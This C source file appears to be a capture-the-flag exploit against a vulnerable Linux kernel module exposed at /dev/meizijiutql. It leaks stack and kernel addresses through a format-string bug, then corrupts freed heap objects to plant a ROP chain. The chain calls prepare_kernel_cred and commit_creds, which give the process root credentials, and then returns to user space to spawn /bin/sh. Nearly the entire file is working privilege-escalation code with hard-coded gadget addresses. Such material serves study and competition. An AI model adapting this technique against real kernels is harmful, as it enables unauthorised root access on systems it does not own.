#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>
#define CRED_SIZE 168
//0xFFFFFFFF819ED1C0 copy_user_generic_unrolled proc near
//0xffffffff810c8d2f: mov rdi, rcx; sub rdi, rdx; mov rax, rdi; ret; 
//0xffffffff81174b83: mov rcx, rax; pop r12; pop r13; mov rax, rcx; ret; 
//0xFFFFFFFF81081790: prepare_kernel_cred
//0xFFFFFFFF81081410: commit_creds
//0xffffffff81001388: pop rdi; ret;
//0xffffffff81043ec8: pushfq; ret;
//0xffffffff81044f17: pop rdx; ret; 
//0xffffffff8104e5b1: mov cr4, rdi; push rdx; popfq; ret;
//0xffffffff81a00d5a: swapgs; popfq; ret;  
//0xffffffff81021762: iretq; ret; 
//0xffffffff81044f17: pop rdx; ret; 
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void su(){
      commit_creds(prepare_kernel_cred(0));
}
void get_shell(void){
	puts("shell:");
    	execve("/bin/sh",0,0);
}



void su_malloc(int fd,int size)
{
	ioctl(fd,0x73311337,size);
}
void su_free(int fd)
{
	ioctl(fd,0xDEADBEEF);
}
unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}
int main()
{	
	setbuf(stdin, 0);
  	setbuf(stdout, 0);
  	setbuf(stderr, 0);
	int fd1 = open("/dev/meizijiutql",O_RDWR);
	char format[150]=
"0x%llx0x%llx0x%llx0x%llx0x%llx0x%lx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx\n";
	char buf1[100]="aaaaaaaa";
	char buf2[100]="bbbbbbbb";
	char buf4[100]="cccccccc";
	unsigned long long module_base ;
	unsigned long long poprdi;
	unsigned long long poprdx;
	unsigned long long movcr4;
	unsigned long long vmbase ; 
	unsigned long long iretq ;
	unsigned long long swapgs ;
	unsigned long long movrcxrax;
	unsigned long long movrdircx;
	unsigned long long rop[0x30];
	
	su_malloc(fd1,CRED_SIZE);
	write(fd1,buf1,150);
	char sb[255];
	read(fd1,sb,255);
	write(1,sb,255);	
	//su_print(fd1);
	su_free(fd1);
	char addr[16];
	write(1,"input stack addr above(ffffxxxxxxxxed8-0x88)       \n",60);
	scanf("%llx",(long long *)addr);
	write(1,"input vmlinux addr above(ffffffff8889a268)        \n",60);
	scanf("%llx",&vmbase);
	vmbase = (vmbase -19505768) - 0xFFFFFFFF81000000;// (0xffffffffa4c9a268-0xffffffffa3a00000));
	printf("%llx",vmbase);
	prepare_kernel_cred = vmbase + 0xFFFFFFFF81081790;
	commit_creds = vmbase + 0xFFFFFFFF81081410;
	swapgs = vmbase + 0xffffffff81a00d5a;
	iretq = vmbase + 0xffffffff81021762;
	poprdi = vmbase + 0xffffffff81001388;
	poprdx = vmbase + 0xffffffff81044f17;
	movcr4 = vmbase +0xffffffff8104e5b1;
	movrcxrax = vmbase + 0xffffffff81174b83;
	unsigned long long pushrax= vmbase +0xffffffff812599a8;	
	unsigned long long poprbx = vmbase +0xffffffff81000926;
	unsigned long long callrbx = vmbase+0xffffffff81a001ea;
	save_stats();
//0xffffffff810c8d2f: mov rdi, rcx; sub rdi, rdx; mov rax, rdi; ret; 
//0xffffffff81174b83: mov rcx, rax; pop r12; pop r13; mov rax, rcx; ret; 
//0xffffffff829654a7: mov rdi, rbx; call rax; 
//0xffffffff8107f537: push rax; pop rbx; ret; 
//0xffffffff8101ac0c: pop rax; ret;
//0xffffffff8296b882: mov rdi, rsi; ret; 
//0xffffffff81a001ea: mov rdi, r12; call rbx; 
//0xffffffff812599a8: push rax; pop r12; pop r13; pop r14; pop r15; ret; 
//0xffffffff81000926: pop rbx; ret; 
	rop[0]=poprdi;
	rop[1]=0;
	rop[2]=prepare_kernel_cred;
	rop[3]=pushrax;
	rop[4]=0;
	rop[5]=0;
	rop[6]=0;
	rop[7]=poprbx;
	rop[8]=poprdx;
	rop[9]=callrbx;
	rop[10]=commit_creds;
	rop[11]=swapgs;
	rop[12]=0;
	rop[13]=iretq;
	rop[14]=(size_t)get_shell;
	rop[15] = user_cs;
	rop[16] = user_eflags;
	rop[17] = user_sp;
	rop[18] = user_ss;
	rop[19] = 0;
	char mem[0xc0+0x10];
	memset(mem,0x41,0xd0);
	memcpy(mem+0xc0,addr,0x10);
	write(1,mem,0xd0);
	su_malloc(fd1,CRED_SIZE);
	write(fd1,mem,0xd0);
	su_malloc(fd1,CRED_SIZE);
	write(fd1,buf2,100);
	su_malloc(fd1,CRED_SIZE);
	write(fd1,(char*)rop,160);
	su_malloc(fd1,CRED_SIZE);
	write(fd1,(char*)rop,160);

/*	
	close(fd1);
	int pid = fork();
	if(pid ==0)
	{
		//set(fd2,buf4,100);
		sleep(2);
		system("/bin/sh");
		//su_malloc(fd1,CRED_SIZE);
		//set(fd1,buf2,CRED_SIZE);
		
	}
	else
	{
		char buf3[2*CRED_SIZE];
		memset(buf3,0,2*CRED_SIZE);
		set(fd2,buf3,2*CRED_SIZE);
		//su_malloc(fd1,CRED_SIZE);
		//set(fd1,buf2,CRED_SIZE);
	}
*/
//	close(fd2);
}
